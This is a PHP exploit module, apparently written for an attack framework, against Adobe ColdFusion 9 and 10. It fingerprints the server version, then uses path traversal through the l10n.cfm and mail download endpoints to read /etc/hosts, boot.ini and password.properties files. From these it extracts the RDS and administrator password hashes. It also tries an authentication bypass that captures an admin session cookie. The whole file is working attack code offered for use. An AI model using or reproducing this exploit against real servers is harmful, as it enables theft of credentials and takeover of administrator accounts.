<?php
     
     
    /*
    ColdFusion v10 Remote Root Zeroday
    Version: 1.0
    Author: HTP
    Adapted to PHP by: Logic
    Date:  09 May 2013
    */
     
     
    namespace exploit;
    use \Framework as Framework;
     

       
       
    class subzero extends Framework {
         
           protected $framework, $name, $description, $variables, $cookie, $os, $version;
       
            public function __construct($framework)
            {
               
                    $this->framework = $framework;
                    $this->name = 'Subzero v2';
                    $this->description = 'CF9-10 Remote Root Zeroday';
                       
                    $this->variables = array(
                    'path' => array('required' => false, 'description' => 'Enter The Path for CFIDE Login', 'default' => '/CFIDE/adminapi/administrator.cfc'),
                    'login' => array('required' => false, 'description' => 'Enter a Valid Login String', 'default' => '?method=login&adminpassword=&rdsPasswordAllowed=true'),
                    'fpd' => array('required' => false, 'description' => 'Enter a Valid Login String', 'default' => '/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=ows'),
                    'etchosts' => array('required' => false, 'description' => ' ', 'default' => '/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../etc/hosts&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=ows'),
                    'bootini' => array('required' => false, 'description' => ' ', 'default' => '/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../boot.ini&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp'),
                );
               
            }
     
            private function loadModule()
            {
                    $this->setModule(1, $this->module_name);
            }
     
            private function installModule()
            {
                    $this->addModule($this->module_name);
                    $this->loadModule();
            }
     
            public function check()
            {
		$h = get_headers($this->target.$this->fpd);
                    foreach ($h as $t) {
                        if(strpos($t,'ANALYZER_DIRECTORY=')!==false){
                           $abspath = urldecode(str_replace('Set-Cookie: ANALYZER_DIRECTORY=','',$t));
                        }
                   }
		$abspath = str_replace('; Path=/', ' ', $abspath);
                print "\n\n\t[*] Absolute Path is Set as: ".$abspath."\n";
                if ($abspath[0] == "/") {
            		print "\t[*] Linux Detected\n";
            		$os = "Linux";
    		} elseif ($abspath[1] == ":") {
            		print "\t[*] Windows Detected\n";
            		$os = "Windows";
    		}
    		else {
			print "Unable to Get OS Version...Sorry :(";
          	  	sleep(2);
		}

		print "\t[*] Detecting Cold Fusion Version\n";
                    $md5request = $this->target."/CFIDE/administrator/images/loginbackground.jpg";
                    $results = md5_file($md5request);
       		    if ($results == "a4c81b7a6289b2fc9b36848fa0cae83c"){
                                print "\t[*] Detected ColdFusion 10\n\n";
		                $this->version = "10";
		    }
       		    else if ($results == "596b3fc4f1a0b818979db1cf94a82220"){
                                print "\t[*] Detected ColdFusion 9\n\n";
		                $this->version = "9";
		    }
       		    else if ($results == "779efc149954677095446c167344dbfc"){
                               print "\t[*] Cannot Exploit\n\n";
			       sleep(2);
          	  	       exit(0);
		    }
		   else {
                               print "\t[*] Cannot Exploit\n\n";
			       sleep(2);	                      
  			       exit(0);
                   }
		return 1;
            }


            public function exploit()
            {
		$this->run();                
		return 0;
            }


	   public function run()
	   {
		print "\n\t[*] Collecting additional data about operating system\n";
		$etchosts = $this->target.$this->etchosts;
		$bootini = $this->target.$this->bootini;

		if (strpos($etchosts,'hosts') !== false || strpos($etchosts,'127.0.0.1') !== false) {
			$os = "Linux";
            		print "\t[*] Linux Detected\n";
		}
		else if (strpos($etchosts,'[boot loader]') !== false || strpos($etchosts,'[operating systems]') !== false) {
			$os = "Windows";
            		print "\t[*] Widows Detected\n";		
		}
		else {
			print "OS is Unknown\n";
			$os = "Unknown";
		}



		print "\t[*] Obtaining credentials\n";
		if ($os == "Windows" && $this->version == "10") {
			$tests = array("..\..\..\..\..\..\..\..\..\ColdFusion10\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\ColdFusion10\cfusion\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties");
		}
		else if ($os == "Windows" && $this->version == "9") {
			$tests = array("..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties");

		}
		else if ($os == "Windows" && $this->version == "Unknown") {
		         $tests = array("..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\ColdFusion10\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\ColdFusion10\cfusion\lib\password.properties", 
							"..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties");
		}
		
		else if ($os == "Linux") {
			if ($this->version == "10") {
			$tests = array("../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties", 
							"../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties");
			}
			else if ($this->version == "9") {
			$tests = array("../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties",  
							"../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties");
			}
			else if ($this->version == "Unknown") {
			$tests = array("../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties", 
							"../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties", 
							"../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties");
			}
		}
		else if ($os == "Unknown") {
		$tests = array("..\..\..\..\..\..\..\..\..\ColdFusion9\lib\password.properties",  
						"..\..\..\..\..\..\..\..\..\ColdFusion10\lib\password.properties", 
						"..\..\..\..\..\..\..\..\..\ColdFusion9\cfusion\lib\password.properties", 
						"..\..\..\..\..\..\..\..\..\ColdFusion10\cfusion\lib\password.properties", 
						"..\..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties", 
						 "../../../../../../../../../opt/coldfusion9/cfusion/lib/password.properties", 
						"../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties", 
						"../../../../../../../../../opt/coldfusion/cfusion/lib/password.properties");
		}
		foreach ($tests as $test) {
		$page = $this->framework->libs['webot']->curl_get_contents("$this->target/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=".$test."&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=ows");
		$decode = html_entity_decode($page);

		if (strpos($decode,'encrypted=') !== false) {
			echo "\n\t[*] RDS Password Hash: ".$this->framework->libs['webot']->return_between($decode, "rdspassword=","\=
password=", 1);
			echo "\n\t[*] Admin Password Hash: ".$this->framework->libs['webot']->return_between($decode, "\=
password=","encrypted=", 1);

		}
		else {
			print "\n\n\t[*] Lets Try one more thing....";

			$h = get_headers($this->target.$this->path.$this->login);
                        foreach ($h as $t) {
                            if(strpos($t,'Set-Cookie: CFAUTHORIZATION_cfadmin=') !== false){
                                if(!(strpos($t,'Set-Cookie: CFAUTHORIZATION_cfadmin=;') !== false)){
                                        $a = str_replace('Set-Cookie: ','',$t);
                                        $a = str_replace(';path=/','',$a);
                                        echo $this->framework->libs['colours']->cstring("\n\n\tAdmin Cookie is: ", "green");
                                        echo $this->framework->libs['colours']->cstring("$a\n\n", "blue");
                                        echo "\tYou may login at: ".$this->target.$this->path."\n\n";
                                }
                            }
                        }
			return 0;
		}
		


		}
	  }



     
            public function post()
            {
                print "This module does not support post Exploit\n";
		return 0;
            }
    }

     
    ?>


